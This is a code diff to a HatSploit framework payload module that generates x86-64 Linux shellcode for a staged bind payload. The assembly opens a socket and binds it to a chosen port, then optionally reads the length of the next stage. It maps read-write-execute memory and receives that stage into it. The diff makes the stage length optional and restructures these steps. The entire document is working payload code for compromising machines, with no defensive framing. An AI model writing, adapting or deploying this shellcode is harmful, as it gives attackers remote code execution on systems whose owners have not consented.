@@ -25,37 +25,14 @@ class HatSploitPayload(Payload, Handler):
 
         self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', 4096, "Length of next phase.",
+        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
-        assembly = f"""
+        assembly = """
         start:
-            push    0x9
-            pop     rax
-            xor     rdi, rdi
-            push    {hex(self.length.value)}
-            pop     rsi
-            push    0x7
-            pop     rdx
-            xor     r9, r9
-            push    0x22
-            pop     r10
-            syscall
-        """
-
-        if self.reliable.value:
-            assembly += """
-                test    rax, rax
-                js      fail
-            """
-
-        assembly += f"""
-            push    rax
-
             push    0x29
             pop     rax
-            cdq
             push    0x2
             pop     rdi
             push    0x1
@@ -70,14 +47,14 @@ class HatSploitPayload(Payload, Handler):
             """
 
         assembly += f"""
-            xchg    rdi, rax
-            push    rdx
+            xchg rdi, rax
+            push rdx
             mov dword ptr [rsp], 0x{self.rport.little.hex()}0002
-            mov     rsi, rsp
-            push    0x10
-            pop     rdx
-            push    0x32
-            pop     rax
+            mov rsi, rsp
+            push 0x10
+            pop rdx
+            push 0x31
+            pop rax
             syscall
         """
 
@@ -112,16 +89,53 @@ class HatSploitPayload(Payload, Handler):
                 js      fail
             """
 
-        assembly += f"""
-            xchg    rdi, rax
-            pop     rcx
-            push    0x2d
-            pop     rax
-            pop     rsi
-            push    {hex(self.length.value)}
-            pop     rdx
-            push    0x100
-            pop     r10
+        if not self.length.value:
+            assembly += """
+                xchg    rdi, rax
+                push 	rdi
+                push	0x4
+                pop 	rdx
+                push 	0x0
+                lea 	rsi, [rsp]
+                xor 	rax, rax
+                syscall
+            """
+
+        else:
+            assembly += f"""
+                push    rax
+                push    {hex(self.length.value)}
+            """
+
+        assembly += """
+            pop 	rsi
+            push 	0x9
+            pop 	rax
+            xor 	rdi, rdi
+            push 	0x7
+            pop 	rdx
+            xor		r9, r9
+            push	0x22
+            pop		r10
+            syscall
+        """
+
+        if self.reliable.value:
+            assembly += """
+                test    rax, rax
+                js      fail
+            """
+
+        assembly += """
+            pop		rdi
+            push 	rsi
+            pop 	rdx
+            push 	rax
+            pop		rsi
+            push 	0x2d
+            pop		rax
+            push	0x100
+            pop		r10
             syscall
         """
 
